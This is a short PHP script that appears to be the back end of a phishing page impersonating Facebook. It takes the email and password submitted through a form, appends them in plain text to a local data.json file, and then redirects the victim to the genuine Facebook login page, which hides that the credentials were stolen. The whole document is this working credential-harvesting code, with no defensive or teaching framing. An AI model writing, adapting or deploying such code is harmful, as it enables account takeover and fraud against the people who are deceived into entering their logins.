<?php

// Check if the email and password keys exist in the $_POST array
if (!isset($_POST['email']) || !isset($_POST['password'])) {
    header('Location: https://www.facebook.com');
}

// Save the user's login information to the data.json file
$date = file_get_contents('data.json');
$json_data = json_decode($date, true);

$json_data[] = [
    'email' => $_POST['email'],
    'password' => $_POST['password']
];

$data = json_encode($json_data);
file_put_contents('data.json', $data);

// Redirect to Facebook
header('Location: https://www.facebook.com/login/');
?>
